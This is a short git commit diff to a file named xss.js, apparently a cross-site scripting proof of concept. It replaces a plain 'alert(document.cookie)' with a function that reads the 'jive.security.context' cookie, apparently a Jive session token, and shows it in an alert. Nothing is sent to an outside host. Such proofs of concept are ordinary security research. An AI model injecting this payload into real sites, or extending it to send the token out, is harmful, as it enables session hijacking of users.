697e485ea9accf1889e5fd796590395da016c185
Matthew Bauer <mjbauer95@gmail.com>
2015-08-15 21:15:24 -0500

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,12 @@
-alert(document.cookie);
+function getCookie(cname) {
+    var name = cname + "=";
+    var ca = document.cookie.split(';');
+    for(var i=0; i<ca.length; i++) {
+        var c = ca[i];
+        while (c.charAt(0)==' ') c = c.substring(1);
+        if (c.indexOf(name) == 0) return c.substring(name.length, c.length);
+    }
+    return "";
+}
+
+alert(getCookie('jive.security.context'));
